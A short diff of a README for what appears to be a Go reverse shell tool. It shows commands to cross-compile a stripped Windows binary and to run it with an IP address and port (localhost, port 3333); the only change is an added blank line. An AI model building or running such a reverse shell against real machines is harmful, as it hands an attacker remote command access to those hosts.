@@ -28,6 +28,7 @@ Cross compile on Linux for Windows:
 <code>GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o revshell.exe revshell.go</code>
 
 To run, provide the IP address and port as command line arguments:
+
 <code>./revshell 127.0.0.1 3333</code>
 
 <code>revshell.exe 127.0.0.1 3333</code>
